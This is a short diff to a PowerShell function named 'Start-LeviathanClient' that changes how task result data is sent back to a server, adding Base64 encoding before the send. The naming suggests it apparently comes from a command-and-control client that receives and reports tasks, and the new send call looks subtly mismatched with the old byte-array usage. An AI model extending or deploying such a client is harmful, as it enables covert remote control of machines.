@@ -112,7 +112,8 @@ function Start-LeviathanClient {
             Default {$ResultData += [BitConverter]::GetBytes(4)}
         }
         Write-Verbose "[+] Sending task result data to server"
-        $client.Send($ResultData, 0, $ResultData.Length)
+        $encData = [Convert]::ToBase64String($ResultData)
+        $client.Send($encData)
         Get-Event -SourceIdentifier "TaskReceived" | Remove-Event
     }
 
